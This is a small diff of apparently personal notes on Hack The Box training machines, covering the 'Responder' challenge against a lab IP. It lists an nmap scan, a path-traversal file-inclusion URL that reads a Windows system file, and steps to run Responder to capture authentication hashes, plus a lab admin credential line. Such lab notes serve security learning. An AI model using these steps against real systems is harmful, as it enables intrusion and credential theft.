@@ -90,10 +90,10 @@
 - admin:svndkfngksjvrdkufhkr
 
 
-## Crocodile challenge:
+## Respondes challenge:
 - nmap -p- --min-rate 1000 -sV 10.129.95.234
 - echo "10.129.95.234 unika.htb" | sudo tee -a /etc/hosts
 - http://unika.htb/index.php?page=../../../../../../../../windows/system32/drivers/etc/hosts
 - git clone https://github.com/lgandx/Responder
 - sudo python2 Responder.py -I tun0
-
+- 
